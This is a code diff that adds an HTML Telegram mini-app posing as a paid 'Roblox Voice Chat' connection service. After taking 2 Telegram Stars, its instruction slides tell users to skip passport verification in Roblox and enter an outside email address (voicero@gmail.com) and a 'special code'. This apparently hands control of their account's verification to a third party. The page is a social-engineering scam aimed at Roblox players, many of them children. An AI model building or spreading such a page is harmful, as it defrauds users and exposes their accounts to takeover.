@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Voice Chat</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin: 20px;
+        }
+        
+        .header {
+            background-color: #00a2ff;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 4px solid white;
+        }
+        
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .username {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #0088cc;
+        }
+        
+        .btn-secondary {
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e0e0e0;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+        
+        .slide {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .slide.active {
+            display: block;
+        }
+        
+        .slide-navigation {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        
+        .slide-indicator {
+            text-align: center;
+            margin-top: 10px;
+            color: #888;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .payment-info {
+            background-color: #fff9e6;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ffcc00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Главный экран -->
+    <div class="container" id="main-screen">
+        <div class="header">
+            <div class="avatar">
+                <img src="https://tr.rbxcdn.com/5b3b0eabf0a2c7a0b8e1a5a5e5e5e5e5/420/420/Avatar/Png" alt="Roblox Avatar">
+            </div>
+            <h2>Roblox Voice Chat</h2>
+        </div>
+        <div class="content">
+            <div class="username" id="telegram-username"></div>
+            <button class="btn" id="login-btn">Войти</button>
+        </div>
+    </div>
+    
+    <!-- Экран подключения -->
+    <div class="container hidden" id="connect-screen">
+        <div class="header">
+            <div class="avatar">
+                <img src="https://cdn-icons-png.flaticon.com/512/3095/3095583.png" alt="Microphone">
+            </div>
+            <h2>Подключение голосового чата</h2>
+        </div>
+        <div class="content">
+            <button class="btn" id="connect-btn">Подключить войс-чат</button>
+        </div>
+    </div>
+    
+    <!-- Экран ввода имени пользователя -->
+    <div class="container hidden" id="username-screen">
+        <div class="header">
+            <h2>Введите данные</h2>
+        </div>
+        <div class="content">
+            <input type="text" class="input-field" id="roblox-username" placeholder="Ваш никнейм в Roblox">
+            <button class="btn" id="submit-btn">Подключить</button>
+        </div>
+    </div>
+    
+    <!-- Экран оплаты -->
+    <div class="container hidden" id="payment-screen">
+        <div class="header">
+            <h2>Оплата услуги</h2>
+        </div>
+        <div class="content">
+            <div class="payment-info">
+                Для подключения голосового чата требуется оплата:
+                <br><strong>2 Telegram Stars</strong>
+            </div>
+            <button class="btn" id="pay-btn">Оплатить 2 Stars</button>
+            <button class="btn btn-secondary" id="cancel-payment-btn">Отмена</button>
+        </div>
+    </div>
+    
+    <!-- Экран инструкции -->
+    <div class="container hidden" id="instructions-screen">
+        <div class="header">
+            <h2>Инструкция по подключению</h2>
+        </div>
+        <div class="content">
+            <!-- Слайд 1 -->
+            <div class="slide active" id="slide-1">
+                <h3>Шаг 1 из 4</h3>
+                <p>Зайдите в Roblox и выберите пункт установки войс чата</p>
+                <p>Вместо паспорта выберите функцию <strong>«Получить по email»</strong></p>
+                <div class="slide-navigation">
+                    <button class="btn btn-secondary" disabled>Назад</button>
+                    <button class="btn" onclick="nextSlide()">Далее</button>
+                </div>
+                <div class="slide-indicator">● ○ ○ ○</div>
+            </div>
+            
+            <!-- Слайд 2 -->
+            <div class="slide" id="slide-2">
+                <h3>Шаг 2 из 4</h3>
+                <p>Введите email:</p>
+                <p><strong>voicero@gmail.com</strong></p>
+                <div class="slide-navigation">
+                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
+                    <button class="btn" onclick="nextSlide()">Далее</button>
+                </div>
+                <div class="slide-indicator">○ ● ○ ○</div>
+            </div>
+            
+            <!-- Слайд 3 -->
+            <div class="slide" id="slide-3">
+                <h3>Шаг 3 из 4</h3>
+                <p>Нажмите "Продолжить" и выберите опцию <strong>«Специальный код»</strong></p>
+                <p>Введите код:</p>
+                <p><strong>99eo61DDmka91</strong></p>
+                <p>Затем нажмите "Продолжить"</p>
+                <div class="slide-navigation">
+                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
+                    <button class="btn" onclick="nextSlide()">Далее</button>
+                </div>
+                <div class="slide-indicator">○ ○ ● ○</div>
+            </div>
+            
+            <!-- Слайд 4 -->
+            <div class="slide" id="slide-4">
+                <h3>Шаг 4 из 4</h3>
+                <p>Подождите 5-7 дней и наслаждайтесь голосовым чатом!</p>
+                <div class="slide-navigation">
+                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
+                    <button class="btn" onclick="finishInstructions()">Готово</button>
+                </div>
+                <div class="slide-indicator">○ ○ ○ ●</div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        
+        // Показываем основную кнопку
+        tg.MainButton.setText("Вернуться в меню");
+        tg.MainButton.hide();
+        
+        // Получаем данные пользователя
+        const user = tg.initDataUnsafe.user;
+        
+        // Элементы интерфейса
+        const mainScreen = document.getElementById('main-screen');
+        const connectScreen = document.getElementById('connect-screen');
+        const usernameScreen = document.getElementById('username-screen');
+        const paymentScreen = document.getElementById('payment-screen');
+        const instructionsScreen = document.getElementById('instructions-screen');
+        
+        // Кнопки
+        const loginBtn = document.getElementById('login-btn');
+        const connectBtn = document.getElementById('connect-btn');
+        const submitBtn = document.getElementById('submit-btn');
+        const payBtn = document.getElementById('pay-btn');
+        const cancelPaymentBtn = document.getElementById('cancel-payment-btn');
+        
+        // Поле ввода
+        const robloxUsername = document.getElementById('roblox-username');
+        
+        // Устанавливаем имя пользователя Telegram
+        if (user) {
+            document.getElementById('telegram-username').textContent = 
+                user.first_name || user.username || 'Пользователь';
+        }
+        
+        // Обработчики событий
+        loginBtn.addEventListener('click', () => {
+            mainScreen.classList.add('hidden');
+            connectScreen.classList.remove('hidden');
+            tg.MainButton.show();
+        });
+        
+        connectBtn.addEventListener('click', () => {
+            connectScreen.classList.add('hidden');
+            usernameScreen.classList.remove('hidden');
+            tg.MainButton.hide();
+        });
+        
+        submitBtn.addEventListener('click', () => {
+            if (!robloxUsername.value.trim()) {
+                tg.showAlert('Пожалуйста, введите ваш никнейм в Roblox');
+                return;
+            }
+            
+            usernameScreen.classList.add('hidden');
+            paymentScreen.classList.remove('hidden');
+            tg.MainButton.hide();
+        });
+        
+        payBtn.addEventListener('click', () => {
+            // Здесь должен быть реальный invoice для оплаты
+            // Для демонстрации используем фиктивную оплату
+            processPayment();
+        });
+        
+        cancelPaymentBtn.addEventListener('click', () => {
+            paymentScreen.classList.add('hidden');
+            mainScreen.classList.remove('hidden');
+            tg.MainButton.hide();
+        });
+        
+        // Обработчик основной кнопки Telegram
+        tg.MainButton.onClick(() => {
+            // Возвращаемся на главный экран
+            connectScreen.classList.add('hidden');
+            usernameScreen.classList.add('hidden');
+            paymentScreen.classList.add('hidden');
+            instructionsScreen.classList.add('hidden');
+            mainScreen.classList.remove('hidden');
+            tg.MainButton.hide();
+        });
+        
+        // Функция обработки платежа
+        function processPayment() {
+            // В реальном приложении здесь должен быть вызов Telegram Payments API
+            // Для демонстрации просто переходим к инструкциям
+            
+            paymentScreen.classList.add('hidden');
+            instructionsScreen.classList.remove('hidden');
+            tg.MainButton.show();
+            
+            // В реальном приложении здесь нужно сохранить факт оплаты
+            // Например, отправить данные на сервер
+            if (user) {
+                const paymentData = {
+                    user_id: user.id,
+                    username: user.username,
+                    roblox_username: robloxUsername.value.trim(),
+                    date: new Date().toISOString(),
+                    status: 'paid'
+                };
+                
+                // Отправка данных на сервер (заглушка)
+                console.log('Payment data:', paymentData);
+            }
+        }
+        
+        // Управление слайдами инструкции
+        let currentSlide = 1;
+        const totalSlides = 4;
+        
+        function nextSlide() {
+            if (currentSlide < totalSlides) {
+                document.getElementById(`slide-${currentSlide}`).classList.remove('active');
+                currentSlide++;
+                document.getElementById(`slide-${currentSlide}`).classList.add('active');
+                updateSlideIndicator();
+            }
+        }
+        
+        function prevSlide() {
+            if (currentSlide > 1) {
+                document.getElementById(`slide-${currentSlide}`).classList.remove('active');
+                currentSlide--;
+                document.getElementById(`slide-${currentSlide}`).classList.add('active');
+                updateSlideIndicator();
+            }
+        }
+        
+        function updateSlideIndicator() {
+            const indicators = document.querySelectorAll('.slide-indicator');
+            indicators.forEach(indicator => {
+                let dots = '';
+                for (let i = 1; i <= totalSlides; i++) {
+                    dots += i === currentSlide ? '● ' : '○ ';
+                }
+                indicator.textContent = dots.trim();
+            });
+        }
+        
+        function finishInstructions() {
+            tg.showAlert('Голосовой чат будет подключен в течение 5-7 дней. Спасибо за использование нашего сервиса!');
+            tg.close();
+        }
+        
+        // Инициализация приложения
+        tg.expand();
+        tg.ready();
+    </script>
+</body>
+</html>
